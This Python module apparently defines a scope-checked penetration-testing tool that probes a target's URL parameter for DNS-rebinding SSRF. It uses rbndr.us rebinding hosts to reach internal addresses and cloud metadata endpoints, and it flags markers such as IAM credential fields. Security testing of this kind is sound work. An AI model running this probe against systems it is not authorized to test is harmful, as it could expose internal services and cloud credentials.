"""probe_dns_rebind — TOCTOU SSRF via DNS rebinding (W29-d).

DNS rebinding tests an SSRF defence that re-resolves a hostname between the
validation check and the actual fetch. The attacker controls a domain that
alternates between a public IP (validates the URL — "looks safe") and an
internal IP (the actual fetch — IMDS / private service).

Default rebind providers:
  - rbndr.us  — alternates 127.0.0.1 / 192.168.0.1 on consecutive resolves
  - 169.254.169.254.rbndr.us  — fixed alternation pattern
  - lock.cmpxchg8b.com         — Tavis Ormandy's rebinder (active mid-2025+)

The probe constructs a rebinding URL using the chosen provider, supplies it
to the target via the operator-specified SSRF sink (a parameter that takes
a URL, typically `url=` / `image_url=` / `webhook=`), and watches the
response for internal-IP-shape content:
  - 169.254.169.254 IMDS markers (ami-id / iam/security-credentials)
  - 127.0.0.1 / RFC1918 internal-page markers (apache welcome / nginx index)
  - cloud metadata headers (Metadata-Flavor: Google / x-instance-id)

VerdictResult:
  - CONFIRMED — response body contains IMDS/internal markers
  - SUSPECTED — response shape diverged significantly from baseline but no
    canonical marker matched
  - FAILED — both probes returned same shape as control

The DNS rebinding itself happens at OS resolver level via the rbndr DNS
TTL=0 trick; Praetor does NOT need to operate a DNS server.
"""

from __future__ import annotations

import hashlib
import re
from typing import Any
from urllib.parse import urlencode, urlparse

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client
from burpsuite_mcp.tools.testing._verdict import error_verdict, make_verdict


# rbndr.us hex-encoded IP pairs. Format: <hex_ip_a>.<hex_ip_b>.rbndr.us
# 7f000001 = 127.0.0.1; a9fea9fe = 169.254.169.254; c0a80001 = 192.168.0.1
_REBIND_HOSTS = [
    ("7f000001.a9fea9fe.rbndr.us", "127.0.0.1↔169.254.169.254"),
    ("7f000001.c0a80001.rbndr.us", "127.0.0.1↔192.168.0.1"),
    ("a9fea9fe.7f000001.rbndr.us", "169.254.169.254↔127.0.0.1"),
]

# Internal-IP-shape markers that prove the resolver hopped to a private IP
_INTERNAL_MARKERS = (
    # AWS IMDSv1
    b"ami-id", b"iam/security-credentials", b"AccessKeyId",
    # GCP / Azure IMDS
    b"Metadata-Flavor", b"computeMetadata", b"subscriptionId",
    # Generic internal services
    b"apache2 ubuntu default", b"welcome to nginx", b"it works!",
    # K8s
    b"/api/v1/namespaces", b"kube-system",
    # Internal-only headers
    b"x-forwarded-server-internal", b"x-internal-route",
)


async def _send_url_param(target_url: str, param_name: str, payload_url: str,
                          method: str = "GET", timeout: int = 30,
                          extra_params: dict | None = None) -> dict:
    """Issue the SSRF probe with `{param_name}={payload_url}`."""
    params = {param_name: payload_url}
    if extra_params:
        params.update(extra_params)
    if method.upper() == "GET":
        sep = "&" if "?" in target_url else "?"
        url = target_url + sep + urlencode(params)
        body = ""
        headers = None
    else:
        url = target_url
        body = urlencode(params)
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
    payload = {
        "method": method,
        "url": url,
        "follow_redirects": False,
        "timeout": timeout,
    }
    if body:
        payload["body"] = body
    if headers:
        payload["headers"] = headers
    return await client.post("/api/http/curl", json=payload)


def _internal_marker_hit(body: str | bytes) -> tuple[bool, str]:
    """Detect IMDS / internal-service markers in response body."""
    if isinstance(body, str):
        b = body.encode("utf-8", errors="replace")
    else:
        b = body or b""
    for m in _INTERNAL_MARKERS:
        if m in b:
            return True, m.decode("ascii", errors="replace")
    return False, ""


def _shape(resp: dict) -> tuple[int, int, str]:
    body = resp.get("response_body") or ""
    if isinstance(body, bytes):
        body = body.decode("utf-8", errors="replace")
    h = hashlib.sha256(body[:8000].encode("utf-8", errors="replace")).hexdigest()[:16]
    return (
        resp.get("status_code", 0),
        len(body),
        h,
    )


def register(mcp: FastMCP) -> None:

    @mcp.tool()
    async def probe_dns_rebind(  # cost: medium (6-9 requests)
        target_url: str,
        url_param_name: str,
        control_url: str = "https://example.com",
        method: str = "GET",
        extra_params: dict | None = None,
        custom_rebind_host: str = "",
        rebind_attempts_per_host: int = 3,
        timeout: int = 30,
    ) -> dict:
        """TOCTOU SSRF probe via DNS rebinding (rbndr.us / custom rebinder).

        For each rebind host (default 3 from rbndr.us; or operator-supplied),
        issue {rebind_attempts_per_host} requests with the rebind URL stuffed
        into {url_param_name} on {target_url}. Watch for internal-IP markers
        in any response (IMDS data, internal welcome page, K8s API shape).

        Establishes a control baseline against {control_url} (example.com)
        for shape comparison.

        VerdictResult:
          - CONFIRMED — internal marker matched in ≥1 response
          - SUSPECTED — response shape diverged significantly from control
            with no marker (server may have cached internal content but
            stripped markers)
          - FAILED — no rebind effect observed

        Args:
            target_url: SSRF sink (URL that accepts a user-supplied URL)
            url_param_name: name of the parameter (e.g. 'url', 'image_url')
            control_url: safe URL for shape baseline
            method: GET or POST
            extra_params: extra params (e.g. {'format': 'json'})
            custom_rebind_host: override default rbndr.us list
            rebind_attempts_per_host: TTL=0 means each attempt re-resolves
            timeout: per-request timeout (s)
        """
        scope = await client.check_scope(target_url)
        if not scope.get("in_scope"):
            return error_verdict("dns_rebind", "out_of_scope",
                                 f"{target_url} not in scope")

        # 1) Control baseline
        control_resp = await _send_url_param(
            target_url, url_param_name, control_url,
            method=method, timeout=timeout, extra_params=extra_params,
        )
        if control_resp.get("error"):
            return error_verdict("dns_rebind", "control_failed",
                                 control_resp.get("error", ""))
        control_status, control_len, control_hash = _shape(control_resp)
        logger_indices = []
        if "logger_index" in control_resp:
            logger_indices.append(control_resp["logger_index"])

        rebind_hosts: list[tuple[str, str]] = (
            [(custom_rebind_host, "operator-supplied")]
            if custom_rebind_host
            else list(_REBIND_HOSTS)
        )

        attempts: list[dict] = []
        confirmed_hit = None
        suspected_hits: list[dict] = []

        for host, label in rebind_hosts:
            rebind_url = f"http://{host}/latest/meta-data/"
            for attempt in range(rebind_attempts_per_host):
                resp = await _send_url_param(
                    target_url, url_param_name, rebind_url,
                    method=method, timeout=timeout, extra_params=extra_params,
                )
                if resp.get("error"):
                    attempts.append({
                        "host": host, "label": label, "attempt": attempt + 1,
                        "error": resp.get("error", ""),
                    })
                    continue
                if "logger_index" in resp:
                    logger_indices.append(resp["logger_index"])
                status, length, h = _shape(resp)
                body = resp.get("response_body") or ""
                hit, marker = _internal_marker_hit(body)
                rec = {
                    "host": host, "label": label, "attempt": attempt + 1,
                    "status": status, "length": length, "hash": h,
                    "internal_marker": marker if hit else "",
                }
                attempts.append(rec)
                if hit:
                    confirmed_hit = rec
                    break
                # Shape divergence: status changed OR length delta ≥ 50%
                len_delta = abs(length - control_len)
                shape_diverged = (
                    status != control_status
                    or (control_len > 0 and len_delta / max(control_len, 1) > 0.5)
                )
                if shape_diverged:
                    suspected_hits.append(rec)
            if confirmed_hit:
                break

        if confirmed_hit:
            return make_verdict(
                vuln_type="dns_rebind_ssrf",
                verdict="CONFIRMED",
                confidence=0.95,
                evidence_summary=f"Internal marker {confirmed_hit['internal_marker']!r} returned on rebind host {confirmed_hit['host']}",
                logger_indices=logger_indices,
                details={
                    "target_url": target_url,
                    "url_param_name": url_param_name,
                    "confirmed_hit": confirmed_hit,
                    "attempts": attempts,
                    "control_shape": {"status": control_status,
                                      "length": control_len,
                                      "hash": control_hash},
                },
                human_summary=f"DNS rebind SSRF: {confirmed_hit['internal_marker']} returned via {confirmed_hit['host']}",
            )
        if suspected_hits:
            best = suspected_hits[0]
            return make_verdict(
                vuln_type="dns_rebind_ssrf",
                verdict="SUSPECTED",
                confidence=0.55,
                evidence_summary=f"Response shape diverged on rebind host {best['host']} but no canonical internal marker matched",
                logger_indices=logger_indices,
                details={
                    "target_url": target_url,
                    "suspected_hits": suspected_hits[:3],
                    "control_shape": {"status": control_status,
                                      "length": control_len,
                                      "hash": control_hash},
                    "attempts": attempts,
                },
                human_summary=f"DNS rebind shape divergence on {best['host']} — manual review",
            )
        return make_verdict(
            vuln_type="dns_rebind_ssrf",
            verdict="FAILED",
            confidence=0.85,
            evidence_summary=f"{len(attempts)} rebind attempts: no internal markers + shape matches control",
            logger_indices=logger_indices,
            details={"attempts_count": len(attempts),
                     "control_shape": {"status": control_status,
                                       "length": control_len}},
            human_summary="DNS rebind defence holds (TOCTOU not exploitable)",
        )
